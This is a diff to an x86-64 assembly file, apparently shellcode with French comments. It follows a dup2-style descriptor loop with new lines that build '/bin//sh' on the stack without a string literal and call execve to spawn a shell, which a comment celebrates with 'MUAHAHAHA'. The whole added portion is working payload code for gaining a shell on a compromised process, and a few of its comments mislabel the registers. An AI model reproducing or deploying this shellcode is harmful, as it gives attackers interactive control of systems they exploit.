@@ -45,3 +45,15 @@ loop_dup:
     dec rsi     ; -1
     jns loop_dup ; rsi >= 0
 
+    ; sys_execve
+    mov rax, 59 ; sys_execve
+    xor rbx, rbx ; argv = NULL
+    push rbx ; argv[0] = NULL (8octets)
+    mov rbx, 0x68732f2f6e69622f ; "/bin//sh" en little-endian dynamique pour pas utiliser de chaîne de caractères (// pour push 8 octets)
+    push rbx ; 
+    mov rdi, rsp ; argv[0] = "/bin//sh"
+    xor rsi, rsi ; argv = NULL
+    xor rdx, rdx ; envp = NULL
+    syscall  ; remplacement du processus par shell MUAHAHAHA!!!
+
+
